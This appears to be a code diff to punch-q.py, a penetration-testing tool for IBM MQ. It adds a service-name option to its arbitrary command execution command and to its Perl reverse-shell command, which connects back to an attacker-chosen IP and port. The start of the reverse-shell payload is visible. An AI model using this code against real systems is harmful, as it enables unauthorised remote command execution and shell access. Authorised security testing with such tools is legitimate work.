@@ -848,9 +848,10 @@ def command():
 @command.command()
 @click.option('--cmd', '-c', type=click.STRING, required=True, help='A base command to execute.')
 @click.option('--args', '-a', type=click.STRING, help='Optional arguments for your command.')
+@click.option('--service-name', '-n', type=click.UNPROCESSED, default=None, help='A service name to use.')
 @click.option('--wait', '-w', default=5, show_default=True,
               help='Number of seconds to wait before cleaning up the service.')
-def execute(cmd, args, wait):
+def execute(cmd, args, service_name, wait):
     """
         Execute an arbitrary command.
 
@@ -860,7 +861,12 @@ def execute(cmd, args, wait):
             python punch-q.py -C pq.yml command execute --cmd "/bin/ping" --args "-c 5 192.168.0.8" --wait 8
     """
 
-    service_name = str(uuid.uuid4()).replace('-', '')[0:16]
+    # Generate a service name if none was provided
+    if not service_name:
+        service_name = uuid.uuid4()
+
+    # Cleanup the service name to remove spaces and dashes and limit to 16 chars
+    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]
 
     # information
     click.secho('Cmd: {0}'.format(cmd), bold=True)
@@ -907,9 +913,10 @@ def execute(cmd, args, wait):
 @command.command()
 @click.option('--ip', '-i', type=click.STRING, required=True, help='The IP address to connect back to.')
 @click.option('--port', '-p', type=click.INT, required=True, help='The port for the connection back.')
+@click.option('--service-name', '-n', type=click.UNPROCESSED, default=None, help='A service name to use.')
 @click.option('--wait', '-w', default=5, show_default=True,
               help='Number of seconds to wait before cleaning up the service.')
-def reverse(ip, port, wait):
+def reverse(ip, port, service_name, wait):
     """
         Start a Perl-based reverse shell.
 
@@ -918,7 +925,12 @@ def reverse(ip, port, wait):
             python punch-q.py -C pq.yml command reverse --ip 192.168.5.1 --port 4444
     """
 
-    service_name = str(uuid.uuid4()).replace('-', '')[0:16]
+    # Generate a service name if none was provided
+    if not service_name:
+        service_name = uuid.uuid4()
+
+    # Cleanup the service name to remove spaces and dashes and limit to 16 chars
+    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]
 
     # raw perl, passed as part of a -e argument
     payload = "use Socket;$i='" + str(ip) + "';$p=" + str(port) + \
